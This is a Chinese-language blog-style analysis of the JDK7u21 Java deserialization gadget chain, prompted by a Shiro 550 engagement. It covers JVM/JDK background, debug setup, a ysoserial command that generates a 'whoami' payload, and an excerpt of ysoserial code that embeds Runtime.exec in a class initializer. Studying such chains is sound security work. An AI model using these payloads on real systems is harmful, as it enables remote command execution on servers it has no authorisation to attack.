# JDK7u21反序列化链利用分析

## 0x0 前言
在一次真实的项目经历中，我遇到了Shiro 550漏洞。尽管尝试了多种常见的序列化链，但均未能成功执行命令。最终，通过使用JDK7u21的序列化链成功实现了命令执行。本文将对这一过程进行详细的学习和分析。

## 0x1 前置知识

### 0x1.1 三大概念
在学习与Java相关的知识时，以下三个基本概念是必不可少的。

#### (1) JVM (Java Virtual Machine)
- **定义**: JVM（Java虚拟机）是一种驻留在内存中的抽象计算机。
- **主要构成**:
  - **类加载器**: 将`.class`文件加载到内存中。
  - **字节码验证工具**: 检查代码中是否存在访问限制违规。
  - **执行引擎**: 将字节码转换为可执行的机器码。
  - **JIT编译器**: 即时编译，用于提高JVM性能，加快Java程序的执行速度。
- **主要作用**:
  - 将Java字节码（由JVM指令集、符号表及补充信息构成的`.class`文件）解释为本地机器码。
  - 不同的操作系统使用不同的JVM映射规则，使Java字节码的解释执行与操作系统无关，从而实现跨平台性。
  - Java语言的跨平台性是基于JVM的不跨平台性。

#### (2) JRE (Java Runtime Environment)
- **定义**: JRE（Java运行环境）由运行和管理Java应用程序所需的类库和工具组成。
- **关系**: 纯粹的JVM不能直接运行Java程序，需要核心类库的支持。因此，可以简单理解为：
  - JRE = JVM + 核心类库 + 一些工具（如密钥库工具`keytool`、jar文件解压缩工具等）

#### (3) JDK (Java Development Kit)
- **定义**: JDK（Java开发工具包）是面向Java开发人员使用的软件开发工具包（SDK）。
- **功能**:
  - 提供Java程序的开发和运行环境。
  - 包含JRE、基础类库（如网络、IO、线程等）、Java源码编译器`javac`以及其他一些开发、诊断、分析、调试和管理的工具和命令（如`jar`、`javah`、`jdb`等）。

### 0x1.2 JDK命名规则
我们通常安装的Java环境版本名称多样，例如Java SE Development Kit 8u261，即所谓的JDK8或Java8。这些名称的变化与JDK发布历史中的多次改名有关。

- **1996-01-23至1999-04-08**: 发行了JDK1.0至JDK1.1.8。
- **1998-12-04至2003-06-26**: 发行了J2SE 1.2至J2SE 1.4.2。
- **2004-09-30**: 发行了Java SE 5.0（内部版本号1.5.0）。
- **后续版本**: Java SE 6.0、Java SE 7.0、Java SE 11.0等。

#### Java命名方式更改的原因
- **1998年12月8日**: Sun公司发布了第二代Java平台（Java2），包括J2ME（微型版）、J2SE（标准版）和J2EE（企业版）。
- **2004年9月30日**: J2SE 1.5更名为Java SE 5.0，以表示该版本的重要性。
- **2005年6月**: Java SE 6正式发布，取消了版本号中的“2”（如J2EE更名为Java EE，J2SE更名为Java SE，J2ME更名为Java ME）。

- **Java SE**: 主要应用于桌面环境。
- **Java EE**: 基于Java SE构建，用于开发企业级应用。
- **Java ME**: 应用于移动设备和嵌入式设备的Java应用程序。

尽管Java SE、Java EE和Java ME所使用的JDK相同，但它们内置的类库存在差异。

## 0x2 调试环境搭建
以下是我在日常工作中使用的调试流程，每个人的偏好可能不同。

### 1. 调试工具
- **IDEA**: 用于调试。
- **Eclipse**: 用于开发。

### 2. 安装不同版本的JDK
- **Mac Homebrew**:
  - 最新版: `brew install java`
  - JDK8及以上: 
    ```sh
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk8
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk9
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk10
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk11
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk12
    ```
  - JDK7: `brew cask install homebrew/cask-versions/zulu7`
  - JDK6: `brew cask install homebrew/cask-versions/java6`

  查看已安装的Java版本和路径: `/usr/libexec/java_home -V`

  如果需要更详细的版本，可以从[Oracle官网](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html)下载并安装。

### 3. 下载ysoserial
```sh
git clone https://github.com/frohoff/ysoserial
cd ysoserial
mvn clean package -DskipTests
```

基本用法:
```sh
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 "whoami" > jdk7u21Object.ser
```

然后将生成的payload导入IDEA中进行进一步分析。

## 0x3 漏洞说明

### 0x3.1 背景说明
该缺陷影响的版本为JRE 7u21。利用此漏洞，攻击者可以通过反序列化特定对象来执行任意命令。

## 0x4 漏洞分析

### 0x4.1 第一层 createTemplatesImpl
首先来看`createTemplatesImpl`方法：

```java
public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
    // 创建一个templates对象
    final T templates = tplClass.newInstance();
    
    // 使用模板gadget类
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    pool.insertClassPath(new ClassClassPath(abstTranslet));
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    
    // 在静态初始化器中运行命令
    String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
        command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
        "\");";
    clazz.makeClassInitializer().insertAfter(cmd);
    
    // 随机名称以允许重复利用（注意PermGen耗尽）
    clazz.setName("ysoserial.Pwner" + System.nanoTime());
}
```

可以看到，`createTemplatesImpl`方法创建了一个`Templates`对象，并在其中插入了恶意代码。接下来我们将逐步分析整个利用链。